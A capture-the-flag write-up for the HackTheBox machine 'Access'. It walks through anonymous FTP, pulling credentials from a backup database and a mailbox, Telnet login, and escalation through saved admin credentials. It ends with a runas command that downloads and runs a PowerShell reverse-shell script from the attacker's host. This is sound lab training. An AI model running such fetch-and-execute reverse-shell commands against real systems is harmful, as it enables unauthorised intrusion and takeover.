---
title: 'HTB: Acces'
date: '2020-11-22 02:40:00 -0400'
categories:
  - HackTheBox
  - Write-ups
tags:
  - HTB
published: true
---


IP: 10.10.10.98

We'll start off with an Nmap scan.
![c81ad7302169efc9d20cd42119386a75.png](./../../assets/img/c81ad7302169efc9d20cd42119386a75.png)

FTP allows for anonymous login.
![a67a1812b8c6f9d1ad46159e0eb64d47.png](./../../assets/img/a67a1812b8c6f9d1ad46159e0eb64d47.png)
![fc62e83b88b06195fabfcf25cf710612.png](./../../assets/img/fc62e83b88b06195fabfcf25cf710612.png)

We have to toggle FTP to binary mode with `bin` in order for the transfer to not error out.
![956fa92fa3dfec1c02f8424893061807.png](./../../assets/img/956fa92fa3dfec1c02f8424893061807.png)
![6af27b67188cf909d2d1ca4850892cc6.png](./../../assets/img/6af27b67188cf909d2d1ca4850892cc6.png)

There are a lot of tables in the backup database.
![4719cff0f388dbe7b3bcd97ad0861cde.png](./../../assets/img/4719cff0f388dbe7b3bcd97ad0861cde.png)

Using `mdb-sql backup.mdb` will show things nicely.
```
list-tables
go
```
![6015579be26d78bf27db0dbf31320fba.png](./../../assets/img/6015579be26d78bf27db0dbf31320fba.png)

There is an `auth_user` table. I can export the data with `mdb-export backup.mdb auth_user`

![1ec7e9068bcf95b969c803c53f890501.png](./../../assets/img/1ec7e9068bcf95b969c803c53f890501.png)

Trying the different credentials doesn't get me into the Telnet port.
![c9517dc7b4658092fdb39952fcb6c0d1.png](./../../assets/img/c9517dc7b4658092fdb39952fcb6c0d1.png)

It does validate that there is an engineer account on the system though. We're unable to unzip the Access Control archive.
![1afb9e22ffabd4debee39e6b490e338e.png](./../../assets/img/1afb9e22ffabd4debee39e6b490e338e.png)

7Zip is able to open it, but it's password protected.
![3a39c844e297cc023785cfc8c6569326.png](./../../assets/img/3a39c844e297cc023785cfc8c6569326.png)

We're able to extract the archive using “access4u@security” as the password.
![907bc52d9cb923321aa3c9a15dc14826.png](./../../assets/img/907bc52d9cb923321aa3c9a15dc14826.png)

Looks like the file is an outlook email folder.
![f151fee990acd4e645a9afbb0798de31.png](./../../assets/img/f151fee990acd4e645a9afbb0798de31.png)

Outlook emails can be read with `readpst`.
![4e31c48f2599a06626082124fe7c9b45.png](./../../assets/img/4e31c48f2599a06626082124fe7c9b45.png)
![80261abf8d907ccce8395f206a8e2751.png](./../../assets/img/80261abf8d907ccce8395f206a8e2751.png)

Now we have a mbox file which can be read with `cat Access Control.mbox`.
![c8f178c602ca2cfae8935f1a52aafba4.png](./../../assets/img/c8f178c602ca2cfae8935f1a52aafba4.png)

Now we should be able to get into the system with Telnet using `security:4Cc3ssC0ntr0ller`.

![ed59975964e7a752f7fd21a7dd04cd61.png](./../../assets/img/ed59975964e7a752f7fd21a7dd04cd61.png)

The user flag is on the desktop.

![ad516708f42274fd535c52f706581959.png](./../../assets/img/ad516708f42274fd535c52f706581959.png)

After some based Windows enumeration we see that there are stored admin creds.
![a6e740727aa4b8398ea1d4a99b2a4338.png](./../../assets/img/a6e740727aa4b8398ea1d4a99b2a4338.png)

They can be found in the credential manager.
![d593cb21c91a0fa3f1f68d0f5ce5d9f7.png](./../../assets/img/d593cb21c91a0fa3f1f68d0f5ce5d9f7.png)

The credentials can't be read.
![f170c5247f527aa6aa9fb2a4d6fb9528.png](./../../assets/img/f170c5247f527aa6aa9fb2a4d6fb9528.png)

We'll host a copy of [mini-reverse](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1). Then we can download it to the target using Certutil.exe. Update the IP and port; 443 is usually a safe port.
![47eb7ef70ed7b91b218c59c07783b53d.png](./../../assets/img/47eb7ef70ed7b91b218c59c07783b53d.png)
![889333b80ed572e70533b1b0521c588b.png](./../../assets/img/889333b80ed572e70533b1b0521c588b.png)
![6b60a760c03e40d9fc004d806a81bf75.png](./../../assets/img/6b60a760c03e40d9fc004d806a81bf75.png)
![ff4449f6e8a4806bbbe6580eabf1ff46.png](./../../assets/img/ff4449f6e8a4806bbbe6580eabf1ff46.png)

Now we should be able to combine this with RunAs to get a shell as Administrator. 
```
runas /user:ACCESS\Administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.34:80/mini-reverse.ps1')"
```
![9ef71313283452cb2832c634016d3e09.png](./../../assets/img/9ef71313283452cb2832c634016d3e09.png)
![05196a3517189ef94d8b32023612f5a9.png](./../../assets/img/05196a3517189ef94d8b32023612f5a9.png)
